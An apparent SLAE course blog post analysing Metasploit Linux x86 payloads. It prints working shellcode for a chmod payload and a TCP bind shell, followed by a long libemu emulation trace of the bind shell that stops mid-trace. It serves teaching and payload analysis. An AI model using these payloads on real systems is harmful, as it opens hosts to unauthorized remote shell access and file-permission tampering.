---
layout: post
title: SLAE 5.3 - Metasploit Payload Analysis chmod
date:   2019-03-03
categories: [SLAE, Assembly]
---
The 3rd msfvenom payload we will analyze is the linux/x86/chmod payload.  
```c
msfvenom -p linux/x86/chmod FILE=/tmp/shdw MODE=0666 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 34 bytes
Final size of c file: 169 bytes
unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0a\x00\x00\x00\x2f\x74\x6d\x70\x2f"
"\x73\x68\x64\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a"
"\x01\x58\xcd\x80";
```
As it turns out, the chmod shellcode causes some errors for libemu so we will analyze this with ndisasm later.  Just to get a bit of practice with libemu, let's run the linux/x86/shell_bind_tcp payload through libemu.
```c
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 RHOST=127.1.1.1 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 78 bytes
Final size of c file: 354 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";
```
# Shortcuts
1. [libemu - shell_bind_tcp](#shell-bind-tcp)
2. [ndisasm - chmod](#chmod)

### Shell_Bind_TCP
We have our shellcode printed out, now let's run it and check the output.  libemu is such a great tool and really makes the analysis much easier.  We get to see the instructions stepped through with the status of the registers.  At the end of the output, the syscalls are all listed out with their arguments.

WARNING: there will be a lot of output.. hopefully it will all make sense once you understand the format.
```
python -c "print '\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'" | sctest -vvv -Ss 100000
verbose = 3
[emu 0x0x9046480 debug ] cpu state    eip=0x00417000
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x9046480 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] cpu state    eip=0x00417000
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x9046480 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 31DB                            xor ebx,ebx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417002
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x9046480 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF ZF 
[emu 0x0x9046480 debug ] F7E3                            mul ebx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417004
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x9046480 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF ZF 
[emu 0x0x9046480 debug ] 53                              push ebx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417005
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x9046480 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF ZF 
[emu 0x0x9046480 debug ] 43                              inc ebx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417006
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
[emu 0x0x9046480 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 53                              push ebx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417007
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
[emu 0x0x9046480 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 6A02                            push byte 0x2
[emu 0x0x9046480 debug ] cpu state    eip=0x00417009
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000001
[emu 0x0x9046480 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 89E1                            mov ecx,esp
[emu 0x0x9046480 debug ] cpu state    eip=0x0041700b
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000001
[emu 0x0x9046480 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] B066                            mov al,0x66
[emu 0x0x9046480 debug ] cpu state    eip=0x0041700d
[emu 0x0x9046480 debug ] eax=0x00000066  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000001
[emu 0x0x9046480 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int socket(int domain=2, int type=1, int protocol=0);
[emu 0x0x9046480 debug ] cpu state    eip=0x0041700f
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000001
[emu 0x0x9046480 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 5B                              pop ebx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417010
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x9046480 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 5E                              pop esi
[emu 0x0x9046480 debug ] cpu state    eip=0x00417011
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x9046480 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 52                              push edx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417012
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x9046480 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 680200115C                      push dword 0x5c110002
[emu 0x0x9046480 debug ] cpu state    eip=0x00417017
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x9046480 debug ] esp=0x00416fc2  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 6A10                            push byte 0x10
[emu 0x0x9046480 debug ] cpu state    eip=0x00417019
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x9046480 debug ] esp=0x00416fbe  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 51                              push ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x0041701a
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 50                              push eax
[emu 0x0x9046480 debug ] cpu state    eip=0x0041701b
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x00416fc2  edx=0x00000000  ebx=0x00000002
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 89E1                            mov ecx,esp
[emu 0x0x9046480 debug ] cpu state    eip=0x0041701d
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000002
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 6A66                            push byte 0x66
[emu 0x0x9046480 debug ] cpu state    eip=0x0041701f
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000002
[emu 0x0x9046480 debug ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417020
[emu 0x0x9046480 debug ] eax=0x00000066  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000002
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] CD80                            int 0x80
[emu 0x0x9046480 debug ] cpu state    eip=0x00417022
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000002
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 894104                          mov [ecx+0x4],eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417025
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000002
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] B304                            mov bl,0x4
[emu 0x0x9046480 debug ] cpu state    eip=0x00417027
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000004
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] B066                            mov al,0x66
[emu 0x0x9046480 debug ] cpu state    eip=0x00417029
[emu 0x0x9046480 debug ] eax=0x00000066  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000004
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int listen(int s=14, int backlog=0);
[emu 0x0x9046480 debug ] cpu state    eip=0x0041702b
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000004
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 43                              inc ebx
[emu 0x0x9046480 debug ] cpu state    eip=0x0041702c
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000005
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] B066                            mov al,0x66
[emu 0x0x9046480 debug ] cpu state    eip=0x0041702e
[emu 0x0x9046480 debug ] eax=0x00000066  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000005
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int accept(int s=14, struct sockaddr *addr=00000000, int *addrlen=00000010);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417030
[emu 0x0x9046480 debug ] eax=0x00000013  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000005
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 93                              xchg eax,ebx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417031
[emu 0x0x9046480 debug ] eax=0x00000005  ecx=0x00416fb6  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 59                              pop ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x00000005  ecx=0x0000000e  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x00000005  ecx=0x0000000e  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x0000000e  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=14);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x0000000e  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x0000000d  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x0000000d  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x0000000e  ecx=0x0000000d  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x0000000d  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=13);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x0000000d  ecx=0x0000000d  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x0000000d  ecx=0x0000000c  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x0000000d  ecx=0x0000000c  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x0000000d  ecx=0x0000000c  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x0000000c  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=12);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x0000000c  ecx=0x0000000c  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x0000000c  ecx=0x0000000b  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x0000000c  ecx=0x0000000b  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x0000000c  ecx=0x0000000b  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x0000000b  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=11);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x0000000b  ecx=0x0000000b  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x0000000b  ecx=0x0000000a  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x0000000b  ecx=0x0000000a  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x0000000b  ecx=0x0000000a  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x0000000a  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=10);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x0000000a  ecx=0x0000000a  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x0000000a  ecx=0x00000009  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x0000000a  ecx=0x00000009  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x0000000a  ecx=0x00000009  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x00000009  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=9);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x00000009  ecx=0x00000009  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x00000009  ecx=0x00000008  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x00000009  ecx=0x00000008  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x00000009  ecx=0x00000008  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x00000008  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=8);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x00000008  ecx=0x00000008  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x00000008  ecx=0x00000007  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x00000008  ecx=0x00000007  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x00000008  ecx=0x00000007  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x00000007  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=7);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x00000007  ecx=0x00000007  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x00000007  ecx=0x00000006  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
